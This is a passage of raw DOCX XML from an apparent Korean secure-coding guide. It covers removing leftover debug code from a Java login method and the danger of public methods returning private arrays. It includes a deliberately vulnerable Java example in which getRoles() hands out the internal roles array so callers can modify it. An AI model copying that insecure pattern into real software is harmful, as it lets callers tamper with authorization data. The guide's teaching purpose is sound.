                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>유출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자까지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>절차</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>디버그</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제거</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>남김</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public boolean login(String id, String pw) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return userDao.checkPassword(id, pw);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  3. Public </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>메소드에서</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>반환된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Private </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>배열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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• private </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> public </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메소드에서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직접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반환하지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않고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복사본을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반환한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] private </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>참조를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>데이터</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>변조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>private String[] roles = {"USER", "MANAGER"};</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public String[] getRoles() {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return roles;  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>호출자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> roles </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>배열을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>수정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>getRoles()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배열</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>참조를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
